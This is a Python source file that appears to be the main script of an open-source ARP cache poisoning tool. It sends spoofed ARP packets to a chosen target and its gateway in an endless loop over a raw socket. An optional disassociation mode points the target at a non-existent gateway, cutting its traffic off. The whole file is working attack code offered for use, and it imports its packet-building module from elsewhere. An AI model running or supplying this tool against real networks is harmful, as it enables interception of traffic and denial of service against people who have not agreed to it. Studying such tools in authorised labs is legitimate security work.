#!/usr/bin/env python3
# https://github.com/EONRaider/Arp-Spoofer

__author__ = 'EONRaider @ keybase.io/eonraider'

import argparse
import time
from socket import htons, ntohs, socket, PF_PACKET, SOCK_RAW

from packets import ARPSetupProxy


class Spoofer(object):
    def __init__(self, interface: str):
        self.interface = interface

    def execute(self, spoofed_packets, interval: float = 0.5):
        with socket(PF_PACKET, SOCK_RAW, ntohs(0x0800)) as sock:
            sock.bind((self.interface, htons(0x0800)))
            while True:
                for packet in spoofed_packets:
                    sock.send(packet)
                time.sleep(interval)


def spoof(args):
    """Control the flow of execution of the ARP Spoofer tool."""

    arp = ARPSetupProxy(interface=args.interface,
                        attacker_mac=args.attackermac,
                        gateway_mac=args.gatemac,
                        gateway_ip=args.gateip,
                        target_mac=args.targetmac,
                        target_ip=args.targetip,
                        disassociate=args.disassociate)
    spoofer = Spoofer(arp.interface)

    __display_user_prompt(proxy=arp)

    try:
        spoofer.execute(arp.packets, args.interval)
    except KeyboardInterrupt:
        raise SystemExit('[!] ARP Spoofing attack terminated.')


def __display_user_prompt(proxy):
    print('\n[>>>] ARP Spoofing configuration:')
    configurations = {'Interface': proxy.interface,
                      'Attacker MAC': proxy.packets.attacker_mac,
                      'Gateway IP': proxy.packets.gateway_ip,
                      'Gateway MAC': proxy.packets.gateway_mac,
                      'Target IP': proxy.packets.target_ip,
                      'Target MAC': proxy.packets.target_mac}

    for configuration, value in configurations.items():
        print('{0: >7} {1: <13}{2:.>25}'.format('[+]', configuration, value))

    while True:
        proceed = input('\n[!] ARP packets ready. Execute the attack with '
                        'these settings? (Y/N) ').lower()
        if proceed == 'y':
            print('\n[+] ARP Spoofing attack initiated. Press Ctrl-C to abort.')
            break
        if proceed == 'n':
            raise SystemExit('[!] ARP Spoofing attack aborted.')


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='Execute ARP Cache Poisoning attacks (a.k.a "ARP '
                    'Spoofing") on local networks.')
    parser.add_argument('targetip', type=str, metavar='IP',
                        help='IP address currently assigned to the target.')
    parser.add_argument('-i', '--interface', type=str,
                        help='Interface on the attacker machine to send '
                             'packets from.')
    parser.add_argument('--attackermac', type=str, metavar='MAC',
                        help='MAC address of the NIC from which the attacker '
                             'machine will send the spoofed ARP packets.')
    parser.add_argument('--gatemac', type=str, metavar='MAC',
                        help='MAC address of the NIC associated to the '
                             'gateway.')
    parser.add_argument('--targetmac', type=str, metavar='MAC',
                        help='MAC address of the NIC associated to the target.')
    parser.add_argument('--gateip', type=str, metavar='IP',
                        help='IP address currently assigned to the gateway.')
    parser.add_argument('--interval', type=float, default=0.5, metavar='TIME',
                        help='Time in between each transmission of spoofed ARP '
                             'packets (defaults to 0.5 seconds).')
    parser.add_argument('--disassociate', action='store_true',
                        help='Execute a disassociation attack in which a '
                             'randomized MAC address is set for the attacker '
                             'machine, effectively making the target host send '
                             'packets to a non-existent gateway.')
    cli_args = parser.parse_args()
    spoof(cli_args)
